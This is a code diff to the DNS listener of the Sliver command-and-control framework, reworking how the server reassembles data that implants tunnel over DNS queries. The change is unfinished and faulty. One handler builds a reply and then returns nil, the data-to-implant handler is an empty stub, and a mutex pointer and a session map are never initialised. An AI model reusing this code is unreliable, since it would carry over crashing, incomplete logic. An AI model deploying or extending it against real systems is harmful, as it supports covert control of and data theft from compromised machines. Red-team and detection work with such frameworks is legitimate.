@@ -58,6 +58,7 @@ import (
 	consts "github.com/bishopfox/sliver/client/constants"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/log"
+	"github.com/emirpasic/gods/lists/singlylinkedlist"
 
 	"github.com/miekg/dns"
 )
@@ -95,49 +96,62 @@ func StartDNSListener(bindIface string, lport uint16, domains []string, canaries
 	return server
 }
 
-// Block - A blob of data that we're sending or receiving, blocks of data
-// are split up into arrays of bytes (chunks) that are encoded per-query
-// the amount of data that can be encoded into a single request or response
-// varies depending on the type of query and the length of the parent domain.
-type Block struct {
-	ID      uint32
-	data    [][]byte
-	Size    int
-	Started time.Time
-	Mutex   sync.Mutex
-}
-
-// AddData - Add data to the block
-func (b *Block) AddData(index int, data []byte) (bool, error) {
-	b.Mutex.Lock()
-	defer b.Mutex.Unlock()
-	if len(b.data) < index+1 {
-		return false, errors.New("Data index out of bounds")
-	}
-	b.data[index] = data
-	sum := 0
-	for _, data := range b.data {
-		sum += len(data)
-	}
-	return sum == b.Size, nil
-}
-
-// Reassemble - Reassemble a block of data
-func (b *Block) Reassemble() []byte {
-	b.Mutex.Lock()
-	defer b.Mutex.Unlock()
-	data := []byte{}
-	for _, block := range b.data {
-		data = append(data, block...)
-	}
-	return data
-}
-
 // DNSSession - Holds DNS session information
 type DNSSession struct {
-	ID        uint32
-	Session   *core.Session
-	CipherCtx *cryptography.CipherContext
+	ID               uint32
+	Session          *core.Session
+	CipherCtx        *cryptography.CipherContext
+	pendingEnvelopes map[uint32]*PendingEnvelope
+	mutex            sync.Mutex
+}
+
+// GetPending - Get a pending message linked list, creates one if it doesn't exist
+func (s *DNSSession) GetPending(dnsMsg *dnspb.DNSMessage) *PendingEnvelope {
+	s.mutex.Lock()
+	defer s.mutex.Unlock()
+	if pendingMsg, ok := s.pendingEnvelopes[dnsMsg.ID]; ok {
+		return pendingMsg
+	}
+	linkedList := singlylinkedlist.New()
+	linkedList.Sort(func(left, right interface{}) int {
+		leftAssert := left.(*dnspb.DNSMessage)
+		rightAssert := right.(*dnspb.DNSMessage)
+		if leftAssert.Start > rightAssert.Start {
+			return 1
+		} else {
+			return -1
+		}
+	})
+	pendingMsg := &PendingEnvelope{
+		Size:     dnsMsg.Size,
+		messages: linkedList,
+	}
+	s.pendingEnvelopes[dnsMsg.ID] = pendingMsg
+	return pendingMsg
+}
+
+// PendingEnvelope - Holds data related to a pending message
+type PendingEnvelope struct {
+	Size     uint32
+	received uint32
+	messages *singlylinkedlist.List
+	mutex    *sync.Mutex
+}
+
+// Insert - Pending message, returns true if message is complete
+func (p *PendingEnvelope) Insert(dnsMsg *dnspb.DNSMessage) bool {
+	p.mutex.Lock()
+	defer p.mutex.Unlock()
+	iter := p.messages.Iterator()
+	p.received += uint32(len(dnsMsg.Data))
+	for iter.Next() {
+		if iter.Value().(*dnspb.DNSMessage).Start > dnsMsg.Start {
+			p.messages.Insert(iter.Index(), dnsMsg)
+			return p.received >= p.Size
+		}
+	}
+	p.messages.Append(dnsMsg)
+	return p.received >= p.Size
 }
 
 // --------------------------- DNS SERVER ---------------------------
@@ -233,8 +247,12 @@ func (s *SliverDNSServer) handleC2(domain string, req *dns.Msg) *dns.Msg {
 	switch msg.Type {
 	case dnspb.DNSMessageType_NOP:
 		return s.handleNOP(domain, msg, checksum, req)
-	case dnspb.DNSMessageType_SESSION_INIT:
+	case dnspb.DNSMessageType_INIT:
 		return s.handleSessionInit(domain, msg, checksum, req)
+	case dnspb.DNSMessageType_DATA_FROM_IMPLANT:
+		return s.handleDataFromImplant(domain, msg, checksum, req)
+	case dnspb.DNSMessageType_DATA_TO_IMPLANT:
+		return s.handleDataToImplant(domain, msg, checksum, req)
 	}
 	return nil
 }
@@ -397,6 +415,39 @@ func (s *SliverDNSServer) handleSessionInit(domain string, msg *dnspb.DNSMessage
 		}
 	}
 	return resp
+}
+
+func (s *SliverDNSServer) handleDataFromImplant(domain string, msg *dnspb.DNSMessage, checksum uint32, req *dns.Msg) *dns.Msg {
+	loadSession, _ := s.sessions.Load(msg.ID & sessionIDBitMask)
+	dnsSession := loadSession.(*DNSSession)
+
+	pending := dnsSession.GetPending(msg)
+	complete := pending.Insert(msg)
+	if complete {
+		// process complete envelope
+	}
+
+	resp := new(dns.Msg)
+	resp.SetReply(req)
+	for _, q := range req.Question {
+		switch q.Qtype {
+		case dns.TypeA:
+			resp.Authoritative = true
+			respBuf := make([]byte, 4)
+			binary.LittleEndian.PutUint32(respBuf, checksum)
+			a := &dns.A{
+				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: s.TTL},
+				A:   respBuf,
+			}
+			resp.Answer = append(resp.Answer, a)
+		}
+	}
+	return nil
+}
+
+func (s *SliverDNSServer) handleDataToImplant(domain string, msg *dnspb.DNSMessage, checksum uint32, req *dns.Msg) *dns.Msg {
+
+	return nil
 }
 
 func (s *SliverDNSServer) handleNOP(domain string, msg *dnspb.DNSMessage, checksum uint32, req *dns.Msg) *dns.Msg {
